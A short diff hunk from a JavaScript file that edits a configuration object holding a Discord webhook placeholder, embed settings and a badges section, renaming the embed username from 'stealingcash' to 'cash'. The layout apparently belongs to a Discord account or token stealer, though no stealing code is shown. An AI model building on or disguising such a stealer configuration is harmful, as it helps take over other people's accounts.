@@ -11,8 +11,8 @@ const fs = require("fs");
 var config = {
     webhook: "%WEBHOOK_LINK%",
     embed: {
-        username: "stealingcash",
-        avatar_url: "https://cdn.discordapp.com/icons/1063153369625149541/47504085755626de4510b90a4c9fc6ad.png?size=128"
+        username: "cash",
+        avatar_url: "https://cdn.discordapp.com/attachments/1094276662792818791/1096401421013889044/rocketlogo.png"
     },
 
     badges: {
